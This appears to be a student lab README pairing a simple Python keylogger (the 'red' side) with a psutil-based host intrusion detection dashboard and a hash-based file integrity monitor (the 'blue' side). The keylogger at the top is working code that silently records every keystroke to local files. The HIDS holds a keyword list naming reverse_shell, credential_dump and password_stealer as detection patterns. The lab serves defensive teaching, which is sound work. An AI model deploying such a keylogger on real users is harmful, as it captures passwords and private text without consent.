# RED-BLUE

### Step 1: Make a new folder (in downloads folder) and name it SecLab

Ctrl + Shift + p Type: Phyton: Select Interpreter

  Install Required Python Module:
```bash
pip install pynput
```

### Keylogger.py
```bash

from pynput import keyboard
import os
import logging
from datetime import datetime

# Ensure logs folder exists
os.makedirs("logs", exist_ok=True)

# Log file with timestamp
log_file = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Capture key strokes
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special: {key}")

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

To run:

```bash
cd Keylogger
python keylogger.py
```

##CREATE NEW FOLDER "HIDS"

Type in terminal:
```bash
pip install psutil
```

hids.py
```bash
import os, csv, time, threading
from datetime import datetime
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import psutil

LOG_DIR = "../logs"
LOG_FILE = os.path.join(LOG_DIR, "hids_alerts.log")
KEYWORDS = ["keylog", "keylogger", "password_stealer", "credential_dump", "reverse_shell", "backdoor", "payload", "malware"]
TRUSTED = {"system idle process", "system", "registry", "svchost.exe", "runtimebroker.exe", "searchhost.exe",
           "taskhostw.exe", "explorer.exe", "chrome.exe", "msedge.exe", "msedgewebview2.exe", "firefox.exe",
           "code.exe", "powershell.exe", "cmd.exe", "conhost.exe", "armourycrate.usersessionhelper.exe"}


class HIDSApp:
    def __init__(self, root):
        self.root, self.running, self.detected = root, False, set()
        self.root.title("HIDS - Host Intrusion Detection System")
        self.root.geometry("1180x700")
        self.root.configure(bg="#0f172a")
        os.makedirs(LOG_DIR, exist_ok=True)

        self.vars = {k: tk.StringVar(value=v) for k, v in {
            "total": "0", "sus": "0", "alerts": "0", "cpu": "0%", "mem": "0%", "status": "Stopped", "filter": "All Processes"
        }.items()}

        self.style()
        self.ui()

    def style(self):
        s = ttk.Style()
        s.theme_use("clam")
        s.configure("Treeview", background="#111827", foreground="#e5e7eb", fieldbackground="#111827", rowheight=28)
        s.configure("Treeview.Heading", background="#1f2937", foreground="#f8fafc", font=("Segoe UI", 9, "bold"))
        s.map("Treeview", background=[("selected", "#2563eb")])

    def ui(self):
        side = tk.Frame(self.root, bg="#020617", width=210)
        side.pack(side="left", fill="y")
        side.pack_propagate(False)

        main = tk.Frame(self.root, bg="#0f172a")
        main.pack(side="right", fill="both", expand=True)

        tk.Label(side, text="🛡  HIDS", bg="#020617", fg="white", font=("Segoe UI", 20, "bold")).pack(anchor="w", padx=20, pady=(25, 2))
        tk.Label(side, text="Host Intrusion Detection", bg="#020617", fg="#94a3b8").pack(anchor="w", padx=23, pady=(0, 25))

        for item in ["Dashboard", "Live Processes", "Alerts", "Logs"]:
            active = item == "Dashboard"
            tk.Label(side, text=f"   {item}", bg="#1d4ed8" if active else "#020617",
                     fg="white" if active else "#cbd5e1", anchor="w", pady=11).pack(fill="x", padx=12, pady=2)

        box = tk.Frame(side, bg="#052e16", highlightbackground="#14532d", highlightthickness=1)
        box.pack(side="bottom", fill="x", padx=14, pady=16)
        tk.Label(box, textvariable=self.vars["status"], bg="#052e16", fg="#22c55e", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=14, pady=(12, 3))
        tk.Label(box, text="System monitoring status", bg="#052e16", fg="#bbf7d0", font=("Segoe UI", 8)).pack(anchor="w", padx=14, pady=(0, 12))

        header = tk.Frame(main, bg="#0f172a")
        header.pack(fill="x", padx=22, pady=(20, 10))
        tk.Label(header, text="Host-Based IDS Dashboard", bg="#0f172a", fg="white", font=("Segoe UI", 22, "bold")).pack(side="left")

        buttons = tk.Frame(header, bg="#0f172a")
        buttons.pack(side="right")
        self.button(buttons, "▶ Start", self.start, "#166534").pack(side="left", padx=5)
        self.button(buttons, "■ Stop", self.stop, "#991b1b").pack(side="left", padx=5)
        self.button(buttons, "Export Logs", self.export_logs, "#334155").pack(side="left", padx=5)

        cards = tk.Frame(main, bg="#0f172a")
        cards.pack(fill="x", padx=22, pady=10)

        for title, key, color in [
            ("Total Processes", "total", "#38bdf8"),
            ("Suspicious", "sus", "#f87171"),
            ("Alerts", "alerts", "#facc15"),
            ("CPU Usage", "cpu", "#22c55e"),
            ("Memory Usage", "mem", "#c084fc")
        ]:
            self.card(cards, title, self.vars[key], color).pack(side="left", fill="x", expand=True, padx=5)

        self.proc_table = self.table_panel(
            main, "LIVE PROCESS MONITOR",
            ("time", "name", "pid", "user", "cpu", "mem", "status", "rep"),
            ("Time", "Process Name", "PID", "User", "CPU %", "Memory MB", "Status", "Reputation"),
            height=10,
            with_filter=True
        )

        self.alert_table = self.table_panel(
            main, "RECENT ALERTS",
            ("time", "type", "process", "pid", "details"),
            ("Time", "Alert Type", "Process", "PID", "Details"),
            height=6
        )

        for tag, color in [("trusted", "#22c55e"), ("normal", "#e5e7eb"), ("suspicious", "#f87171"), ("alert", "#f87171")]:
            self.proc_table.tag_configure(tag, foreground=color)
            self.alert_table.tag_configure(tag, foreground=color)

    def button(self, parent, text, cmd, color):
        return tk.Button(parent, text=text, command=cmd, bg=color, fg="white", relief="flat",
                         padx=14, pady=8, font=("Segoe UI", 9, "bold"), cursor="hand2")

    def card(self, parent, title, var, color):
        f = tk.Frame(parent, bg="#111827", highlightbackground="#1e293b", highlightthickness=1)
        tk.Label(f, text=title, bg="#111827", fg="#94a3b8").pack(anchor="w", padx=15, pady=(13, 3))
        tk.Label(f, textvariable=var, bg="#111827", fg=color, font=("Segoe UI", 20, "bold")).pack(anchor="w", padx=15, pady=(0, 12))
        return f

    def table_panel(self, parent, title, cols, heads, height=8, with_filter=False):
        p = tk.Frame(parent, bg="#111827", highlightbackground="#1e293b", highlightthickness=1)
        p.pack(fill="both", expand=True, padx=22, pady=(8, 10))

        top = tk.Frame(p, bg="#111827")
        top.pack(fill="x", padx=14, pady=(12, 8))
        tk.Label(top, text=title, bg="#111827", fg="white", font=("Segoe UI", 10, "bold")).pack(side="left")

        if with_filter:
            ttk.Combobox(top, textvariable=self.vars["filter"], values=["All Processes", "Suspicious Only", "Trusted Only"],
                         state="readonly", width=18).pack(side="right")

        t = ttk.Treeview(p, columns=cols, show="headings", height=height)
        for c, h in zip(cols, heads):
            t.heading(c, text=h)
            t.column(c, width=120, anchor="center")

        if "name" in cols: t.column("name", width=220)
        if "details" in cols: t.column("details", width=450)

        t.pack(fill="both", expand=True, padx=14, pady=(0, 14))
        return t

    def start(self):
        if self.running:
            return messagebox.showinfo("HIDS", "Monitoring is already running.")
        self.running = True
        self.vars["status"].set("Monitoring")
        threading.Thread(target=self.monitor, daemon=True).start()
        self.add_alert("System Started", "HIDS", "N/A", "Monitoring started.")

    def stop(self):
        self.running = False
        self.vars["status"].set("Stopped")
        self.add_alert("System Stopped", "HIDS", "N/A", "Monitoring stopped.")

    def monitor(self):
        while self.running:
            rows, suspicious = [], 0
            cpu_total = psutil.cpu_percent(interval=0.2)
            mem_total = psutil.virtual_memory().percent

            for p in psutil.process_iter(["pid", "name", "username", "cmdline", "memory_info", "status"]):
                try:
                    i = p.info
                    name = i.get("name") or "unknown"
                    pid = i.get("pid")
                    user = str(i.get("username") or "N/A").split("\\")[-1]
                    cmd = " ".join(i.get("cmdline") or [])
                    mem = round((i["memory_info"].rss / 1048576), 2) if i.get("memory_info") else 0
                    cpu = round(p.cpu_percent(interval=0.0), 1)
                    rep, reason = self.check(name, cmd, cpu, mem)

                    if rep == "Suspicious":
                        suspicious += 1
                        self.add_alert_once("Suspicious Process Detected", name, pid, reason)

                    rows.append((datetime.now().strftime("%H:%M:%S"), name, pid, user, cpu, mem, i.get("status") or "running", rep))
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass

            self.root.after(0, self.refresh, rows, suspicious, cpu_total, mem_total)
            time.sleep(2)

    def check(self, name, cmd, cpu, mem):
        n, text = name.lower(), f"{name} {cmd}".lower()
        if n in TRUSTED:
            return "Trusted", "Trusted process"
        for word in KEYWORDS:
            if word in text:
                return "Suspicious", f"Matched suspicious pattern: {word}"
        if cpu >= 80:
            return "Suspicious", f"Unusual CPU usage: {cpu}%"
        if mem >= 800:
            return "Suspicious", f"Unusual memory usage: {mem} MB"
        return "Normal", "No suspicious behavior"

    def refresh(self, rows, suspicious, cpu, mem):
        self.proc_table.delete(*self.proc_table.get_children())
        mode = self.vars["filter"].get()

        for r in rows[:120]:
            rep = r[-1]
            if mode == "Suspicious Only" and rep != "Suspicious": continue
            if mode == "Trusted Only" and rep != "Trusted": continue
            self.proc_table.insert("", "end", values=r, tags=(rep.lower(),))

        self.vars["total"].set(str(len(rows)))
        self.vars["sus"].set(str(suspicious))
        self.vars["cpu"].set(f"{cpu}%")
        self.vars["mem"].set(f"{mem}%")

    def add_alert_once(self, alert_type, process, pid, details):
        key = f"{process}-{pid}-{details}"
        if key not in self.detected:
            self.detected.add(key)
            self.add_alert(alert_type, process, pid, details)

    def add_alert(self, alert_type, process, pid, details):
        ts = datetime.now().strftime("%H:%M:%S")
        row = (ts, alert_type, process, pid, details)
        self.alert_table.insert("", 0, values=row, tags=("alert",))
        self.vars["alerts"].set(str(int(self.vars["alerts"].get()) + 1))
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {alert_type} | {process} | PID={pid} | {details}\n")

    def export_logs(self):
        path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV File", "*.csv")])
        if not path: return
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["Time", "Alert Type", "Process", "PID", "Details"])
            for item in self.alert_table.get_children():
                w.writerow(self.alert_table.item(item)["values"])
        messagebox.showinfo("HIDS", "Logs exported successfully.")

    def close(self):
        self.running = False
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = HIDSApp(root)
    root.protocol("WM_DELETE_WINDOW", app.close)
    root.mainloop()

## FIM.py

```python
import os
import hashlib
import time
from datetime import datetime
import shutil
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from collections import Counter

LAB_ROOT_DIR = os.path.abspath('.')
BACKUP_DIR = "backups"
HASH_DB = "logs/fim_hashes.txt"
ALERT_LOG = "logs/fim_alerts.txt"

os.makedirs("logs", exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

def get_hash(path):
    try:
        with open(path, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return None

def load_hashes():
    if not os.path.exists(HASH_DB):
        return {}

    hashes = {}
    with open(HASH_DB) as f:
        for line in f.read().splitlines():
            try:
                path, h = line.split(" || ")
                hashes[path] = h
            except Exception:
                continue
    return hashes

def save_hashes(hashes):
    with open(HASH_DB, 'w') as f:
        for path, h in hashes.items():
            f.write(f"{path} || {h}\n")

def log_alert(event, path):
    line = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {event.upper()}: {path}"
    with open(ALERT_LOG, 'a') as f:
        f.write(line + "\n")
    return line

def backup_file(path):
    backup_path = os.path.join(
        BACKUP_DIR,
        os.path.relpath(path, LAB_ROOT_DIR).replace(os.sep, "_")
    )
    try:
        shutil.copy2(path, backup_path)
    except Exception:
        pass

def restore_file(path):
    backup_path = os.path.join(
        BACKUP_DIR,
        os.path.relpath(path, LAB_ROOT_DIR).replace(os.sep, "_")
    )

    if not os.path.exists(backup_path):
        return "No backup available for this file."

    try:
        shutil.copy2(backup_path, path)
        return f"Restored: {path} from backup"
    except Exception:
        return "Failed to restore: admin rights or locked file."

def initial_backup(files):
    for path in files:
        backup_file(path)

def get_event_counts():
    if not os.path.exists(ALERT_LOG):
        return Counter()

    events = []
    with open(ALERT_LOG) as f:
        for line in f:
            if ":" in line:
                event_type = line.split("]")[1].split(":")[0].strip()
                file = ":".join(line.split(":")[2:]).strip()
                events.append((event_type, file))

    return Counter(events)


class FIMApp:
    def __init__(self, root):
        self.root = root
        self.root.title("File Integrity Monitor - Modern SOC Dashboard")
        self.root.geometry("1250x650")

        style = ttk.Style(self.root)
        style.theme_use("clam")

        title = tk.Label(
            root,
            text="Real-Time File Integrity Dashboard",
            font=("Segoe UI", 22, "bold"),
            fg="#1976d2"
        )
        title.pack(pady=(14, 7))

        subtitle = tk.Label(
            root,
            text="Monitoring file changes: added, modified, and deleted files.",
            font=("Segoe UI", 12),
            fg="#6d6d6d"
        )
        subtitle.pack(pady=(0, 6))

        columns = ("Time", "Event", "File")
        self.tree = ttk.Treeview(root, columns=columns, show="headings", height=24)

        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, anchor=tk.CENTER if col == "Time" else tk.W)

        self.tree.column("Time", width=170)
        self.tree.column("Event", width=110)
        self.tree.column("File", width=950)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=8)

        button_frame = tk.Frame(root)
        button_frame.pack(pady=(10, 8))

        tk.Button(button_frame, text="View Full Logs", command=self.view_logs, width=17).pack(side=tk.LEFT, padx=8)
        tk.Button(button_frame, text="Clear Table", command=self.clear_table, width=17).pack(side=tk.LEFT, padx=8)
        tk.Button(button_frame, text="Export Report", command=self.export_report, width=17, bg="#388e3c", fg="white").pack(side=tk.LEFT, padx=8)
        tk.Button(button_frame, text="Restore Selected File", command=self.restore_selected, width=19, bg="#0d47a1", fg="white").pack(side=tk.LEFT, padx=8)
        tk.Button(button_frame, text="Show Analytics", command=self.show_analytics, width=16, bg="#ff9800", fg="white").pack(side=tk.LEFT, padx=8)

        self.running = True
        self.reported_events = set()
        threading.Thread(target=self.monitor_thread, daemon=True).start()

    def monitor_thread(self):
        previous_hashes = load_hashes()

        while self.running:
            current_hashes = {}
            monitored_files = []

            for rootdir, _, files in os.walk(LAB_ROOT_DIR):
                for file in files:
                    fpath = os.path.join(rootdir, file)

                    if BACKUP_DIR in rootdir or fpath.endswith(HASH_DB) or fpath.endswith(ALERT_LOG):
                        continue

                    h = get_hash(fpath)

                    if h:
                        current_hashes[fpath] = h
                        monitored_files.append(fpath)

            if not os.listdir(BACKUP_DIR):
                initial_backup(monitored_files)

            for path in previous_hashes:
                if path not in current_hashes:
                    self.report_event("deleted", "Deleted", path)

            for path in previous_hashes:
                if path in current_hashes and current_hashes[path] != previous_hashes[path]:
                    self.report_event("modified", "Modified", path)
                    backup_file(path)

            for path in current_hashes:
                if path not in previous_hashes:
                    self.report_event("added", "Added", path)
                    backup_file(path)

            save_hashes(current_hashes)
            previous_hashes = dict(current_hashes)
            time.sleep(1.5)

    def report_event(self, key_name, event_name, path):
        event_id = f"{key_name}:{path}"

        if event_id in self.reported_events:
            return

        log_alert(event_name, path)
        self.add_event(event_name, path)
        self.reported_events.add(event_id)

    def add_event(self, event, file):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.tree.insert("", 0, values=(timestamp, event, file), tags=(event,))

        self.tree.tag_configure("Deleted", foreground="#e53935")
        self.tree.tag_configure("Modified", foreground="#ffb300")
        self.tree.tag_configure("Added", foreground="#43a047")
        self.tree.tag_configure("Restored", foreground="#1976d2")

    def clear_table(self):
        for row in self.tree.get_children():
            self.tree.delete(row)

    def view_logs(self):
        if not os.path.exists(ALERT_LOG):
            messagebox.showinfo("Logs", "No logs file found.")
            return

        window = tk.Toplevel(self.root)
        window.title("Complete FIM Alert Log")

        txt = scrolledtext.ScrolledText(
            window,
            wrap=tk.WORD,
            height=30,
            width=120,
            font=("Consolas", 10)
        )
        txt.pack()

        with open(ALERT_LOG, 'r') as f:
            logs = f.read()

        txt.insert(tk.END, logs if logs else "No logs yet.")

    def export_report(self):
        if not os.path.exists(ALERT_LOG):
            messagebox.showinfo("Export Report", "No logs to export.")
            return

        export_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")],
            title="Export Report As"
        )

        if not export_path:
            return

        with open(ALERT_LOG, 'r') as f:
            logs = f.read()

        with open(export_path, 'w') as out_file:
            out_file.write(logs)

        messagebox.showinfo("Export Successful", f"Report exported to:\n{export_path}")

    def restore_selected(self):
        selected = self.tree.selection()

        if not selected:
            messagebox.showinfo("Restore File", "Please select a file row to restore.")
            return

        filepath = self.tree.item(selected[0], 'values')[2]
        result = restore_file(filepath)

        messagebox.showinfo("Restore File", result)

        if result.startswith("Restored"):
            log_alert("Restored", filepath)
            self.add_event("Restored", filepath)

    def show_analytics(self):
        counts = get_event_counts()
        file_counter = Counter()
        event_counter = Counter()

        for (event, file), count in counts.items():
            file_counter[file] += count
            event_counter[event] += count

        msg = "Top Targeted/Deleted/Modified Files:\n"

        for file, count in file_counter.most_common(5):
            msg += f"{file} - {count} events\n"

        msg += "\nEvent Summary:\n"

        for event, count in event_counter.most_common():
            msg += f"{event}: {count}\n"

        messagebox.showinfo("FIM Analytics", msg)

    def on_close(self):
        self.running = False
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = FIMApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()
```

### To run:

```bash
cd FIM
python fim.py
```

```

To run:
```bash
python fim.py
```

#### then create any txt file in the protected files, see the changes in fim_alerts.


